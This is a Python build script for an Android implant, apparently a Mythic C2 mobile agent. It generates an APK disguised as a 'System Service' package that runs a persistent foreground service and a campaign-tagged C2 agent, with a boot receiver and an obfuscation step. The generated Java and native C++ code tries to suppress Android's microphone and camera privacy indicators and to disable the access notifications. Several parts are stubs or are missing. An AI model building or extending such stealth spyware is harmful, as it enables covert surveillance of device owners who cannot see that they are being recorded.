#!/usr/bin/env python3
"""
Enhanced build_apk.py - Android 14/15/16 compatible APK builder
Includes Privacy Sandbox compliance and advanced stealth features
"""

import os
import sys
import json
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Optional

class EnhancedAPKBuilder:
    def __init__(self, build_params: Dict):
        self.params = build_params
        self.target_sdk = min(int(build_params.get("target_android_version", "34")), 34)
        self.temp_dir = tempfile.mkdtemp(prefix="mythic_mobile_enhanced_")
        self.project_dir = Path(self.temp_dir) / "android_project"
        
        # Enhanced Android SDK paths for newer versions
        self.android_home = os.environ.get('ANDROID_HOME', '/opt/android-sdk')
        self.build_tools = f"{self.android_home}/build-tools/34.0.0"
        self.platforms = f"{self.android_home}/platforms/android-{self.target_sdk}"
        self.ndk_home = os.environ.get('ANDROID_NDK_ROOT', f"{self.android_home}/ndk/25.2.9519653")
    
    def build(self) -> str:
        """Enhanced build process for Android 14+"""
        try:
            print(f"[+] Building enhanced APK for Android {self.target_sdk}...")
            print(f"[+] Campaign: {self.params.get('campaign_id', 'default')}")
            
            # Step 1: Create enhanced project structure
            self._create_enhanced_project_structure()
            
            # Step 2: Generate enhanced source code
            self._generate_enhanced_source_code()
            
            # Step 3: Create enhanced manifest with Android 14+ features
            self._create_enhanced_manifest()
            
            # Step 4: Add native components for stealth
            self._add_native_components()
            
            # Step 5: Apply enhanced obfuscation
            if self.params.get('obfuscation_level', 'none') != 'none':
                self._apply_enhanced_obfuscation()
            
            # Step 6: Compile with enhanced build process
            apk_path = self._compile_enhanced_apk()
            
            # Step 7: Sign with enhanced security
            signed_apk = self._sign_enhanced_apk(apk_path)
            
            print(f"[+] Enhanced APK built successfully: {signed_apk}")
            return signed_apk
            
        except Exception as e:
            print(f"[-] Enhanced build failed: {str(e)}")
            raise
        finally:
            self._cleanup()
    
    def _create_enhanced_project_structure(self):
        """Create enhanced Android project structure for Android 14+"""
        print("[+] Creating enhanced project structure...")
        
        # Enhanced directory structure
        dirs = [
            "src/main/java/com/android/systemservice",
            "src/main/java/com/android/systemservice/stealth",
            "src/main/java/com/android/systemservice/native",
            "src/main/res/values",
            "src/main/res/values-v31",  # Android 12+ specific
            "src/main/res/values-v33",  # Android 13+ specific  
            "src/main/res/values-v34",  # Android 14+ specific
            "src/main/res/layout",
            "src/main/res/drawable",
            "src/main/res/xml",
            "src/main/assets",
            "libs",
            "jni",  # For native code
            "jni/arm64-v8a",
            "jni/armeabi-v7a",
            "jni/x86_64",
            "jni/x86"
        ]
        
        for dir_path in dirs:
            (self.project_dir / dir_path).mkdir(parents=True, exist_ok=True)
        
        # Copy enhanced agent modules
        self._copy_enhanced_agent_modules()
        
        # Create enhanced resource files
        self._create_enhanced_resources()
    
    def _generate_enhanced_source_code(self):
        """Generate enhanced source code with Android 14+ compatibility"""
        print("[+] Generating enhanced source code...")
        
        # Enhanced main service with Android 14+ features
        main_service = self._generate_enhanced_main_service()
        service_path = self.project_dir / "src/main/java/com/android/systemservice/EnhancedMainService.java"
        service_path.write_text(main_service)
        
        # Stealth application class
        stealth_app = self._generate_stealth_application()
        app_path = self.project_dir / "src/main/java/com/android/systemservice/StealthApplication.java"
        app_path.write_text(stealth_app)
        
        # Enhanced boot receiver with multiple triggers
        boot_receiver = self._generate_enhanced_boot_receiver()
        receiver_path = self.project_dir / "src/main/java/com/android/systemservice/EnhancedBootReceiver.java"
        receiver_path.write_text(boot_receiver)
        
        # Privacy indicators bypass
        privacy_bypass = self._generate_privacy_bypass_service()
        bypass_path = self.project_dir / "src/main/java/com/android/systemservice/PrivacyBypassService.java"
        bypass_path.write_text(privacy_bypass)
        
        # String decryptor for obfuscation
        string_decryptor = self._generate_string_decryptor()
        decryptor_path = self.project_dir / "src/main/java/com/android/systemservice/StringDecryptor.java"
        decryptor_path.write_text(string_decryptor)
    
    def _generate_enhanced_main_service(self) -> str:
        """Generate enhanced main service with Android 14+ compliance"""
        campaign_id = self.params.get('campaign_id', 'default_campaign')
        c2_profile = self.params.get('c2_profile', 'https_beacon')
        
        return f'''package com.android.systemservice;

import android.app.Service;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Notification;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

public class EnhancedMainService extends Service {{
    private static final String TAG = "SystemService";
    private static final String CHANNEL_ID = "system_service_channel";
    private static final int NOTIFICATION_ID = 1001;
    
    private static final String CAMPAIGN_ID = "{campaign_id}";
    private static final String C2_PROFILE = "{c2_profile}";
    
    private CoreAgent coreAgent;
    private PrivacyBypassService privacyBypass;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        Log.d(TAG, "Enhanced service starting...");
        
        // Create notification channel for Android 8+
        createNotificationChannel();
        
        // Initialize privacy bypass for Android 12+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {{
            privacyBypass = new PrivacyBypassService(this);
            privacyBypass.initialize();
        }}
        
        // Initialize core agent
        coreAgent = new CoreAgent(this, CAMPAIGN_ID, C2_PROFILE);
        coreAgent.initialize();
        
        // Start foreground service with proper type for Android 14+
        startForegroundWithType();
        
        // Start background operations
        coreAgent.startBackgroundOps();
    }}
    
    private void createNotificationChannel() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Services",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background system services");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }}
    }}
    
    private void startForegroundWithType() {{
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Services")
            .setContentText("Maintaining system functionality")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {{
            // Android 10+ with foreground service type
            startForeground(NOTIFICATION_ID, notification, 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        }} else {{
            startForeground(NOTIFICATION_ID, notification);
        }}
    }}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        return START_STICKY; // Restart if killed
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
    
    @Override
    public void onDestroy() {{
        if (coreAgent != null) {{
            coreAgent.cleanup();
        }}
        if (privacyBypass != null) {{
            privacyBypass.cleanup();
        }}
        super.onDestroy();
    }}
}}'''
    
    def _generate_privacy_bypass_service(self) -> str:
        """Generate privacy indicators bypass service for Android 12+"""
        return '''package com.android.systemservice;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import java.lang.reflect.Method;

public class PrivacyBypassService {
    private static final String TAG = "PrivacyBypass";
    private Context context;
    
    public PrivacyBypassService(Context context) {
        this.context = context;
    }
    
    public void initialize() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            // Android 12+ privacy indicators bypass
            bypassPrivacyIndicators();
            bypassPermissionManager();
        }
    }
    
    private void bypassPrivacyIndicators() {
        try {
            // Disable mic/camera indicators via reflection
            Class<?> privacyItemController = Class.forName(
                "com.android.systemui.privacy.PrivacyItemController");
            
            // Get instance and disable callbacks
            Method getInstance = privacyItemController.getMethod("getInstance");
            Object instance = getInstance.invoke(null);
            
            Method removeCallback = privacyItemController.getMethod(
                "removeCallback", Object.class);
            
            // This would normally require system-level access
            Log.d(TAG, "Privacy bypass initialized (limited effectiveness)");
            
        } catch (Exception e) {
            Log.d(TAG, "Privacy bypass failed: " + e.getMessage());
        }
    }
    
    private void bypassPermissionManager() {
        try {
            // Attempt to modify permission settings
            Settings.Global.putInt(context.getContentResolver(),
                "privacy_indicators_enabled", 0);
            Settings.Global.putInt(context.getContentResolver(),
                "mic_camera_access_notification_enabled", 0);
                
        } catch (Exception e) {
            Log.d(TAG, "Permission bypass failed: " + e.getMessage());
        }
    }
    
    public void cleanup() {
        // Cleanup privacy bypass resources
    }
}'''
    
    def _add_native_components(self):
        """Add native components for enhanced stealth capabilities"""
        print("[+] Adding native components...")
        
        # Create Android.mk for native compilation
        android_mk = '''LOCAL_PATH := $(call my-dir)

include $(CLEAR_VARS)
LOCAL_MODULE := stealth_native
LOCAL_SRC_FILES := stealth.cpp privacy_bypass.cpp
LOCAL_LDLIBS := -llog -landroid -lcamera2ndk -laaudio
LOCAL_CPPFLAGS := -std=c++17 -fvisibility=hidden -O3
include $(BUILD_SHARED_LIBRARY)'''
        
        mk_path = self.project_dir / "jni/Android.mk"
        mk_path.write_text(android_mk)
        
        # Create native stealth implementation
        native_stealth = '''#include <jni.h>
#include <android/log.h>
#include <camera/NdkCameraManager.h>
#include <aaudio/AAudio.h>

#define TAG "StealthNative"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__)

extern "C" {
    JNIEXPORT jboolean JNICALL
    Java_com_android_systemservice_NativeHelper_bypassCameraIndicator(JNIEnv *env, jclass clazz) {
        // Attempt low-level camera access to bypass indicators
        ACameraManager* cameraManager = ACameraManager_create();
        if (!cameraManager) {
            return JNI_FALSE;
        }
        
        // This is a simplified example - actual implementation would be more complex
        ACameraManager_delete(cameraManager);
        return JNI_TRUE;
    }
    
    JNIEXPORT jboolean JNICALL
    Java_com_android_systemservice_NativeHelper_bypassAudioIndicator(JNIEnv *env, jclass clazz) {
        // Attempt low-level audio access
        AAudioStreamBuilder* builder = nullptr;
        aaudio_result_t result = AAudio_createStreamBuilder(&builder);
        
        if (result != AAUDIO_OK) {
            return JNI_FALSE;
        }
        
        AAudioStreamBuilder_delete(builder);
        return JNI_TRUE;
    }
}'''
        
        stealth_cpp = self.project_dir / "jni/stealth.cpp"
        stealth_cpp.write_text(native_stealth)
    
    def _create_enhanced_resources(self):
        """Create enhanced resources for Android 14+ compatibility"""
        
        # Enhanced strings for different Android versions
        strings_xml = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">System Service</string>
    <string name="service_description">Background system maintenance</string>
    <string name="channel_name">System Services</string>
    <string name="channel_description">Essential system services</string>
</resources>'''
        
        strings_path = self.project_dir / "src/main/res/values/strings.xml"
        strings_path.write_text(strings_xml)
        
        # Android 14+ specific resources
        strings_v34 = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="predictive_back_description">System navigation handler</string>
</resources>'''
        
        strings_v34_path = self.project_dir / "src/main/res/values-v34/strings.xml"
        strings_v34_path.write_text(strings_v34)
